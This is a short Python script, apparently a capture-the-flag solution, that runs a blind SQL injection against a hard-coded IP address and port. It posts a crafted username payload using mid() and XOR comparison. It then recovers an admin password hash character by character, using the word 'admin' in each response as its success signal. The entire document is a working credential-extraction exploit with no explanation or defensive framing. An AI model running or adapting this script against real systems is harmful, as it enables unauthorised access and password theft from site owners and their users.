#!/usr/bin/python
# coding:utf-8 

import requests 

def getPassword():
    url = "http://117.34.111.15:89?action=show"
    # data = {"username":}
    username = "admin'^!(mid((passwd)from(-{pos}))='{passwd}')='1"
    strBase = "1234567890abcdef"
    passwd = ""
    for k in range(1,34):
        print passwd
        for i in strBase:
            passwdTmp = i+passwd
            data = {"username":username.format(pos=str(k),passwd=passwdTmp)}
            
            # print data
            res = requests.post(url,data)
            if "admin" in res.text:
                passwd = passwdTmp
                break  


if __name__ == "__main__":
    getPassword()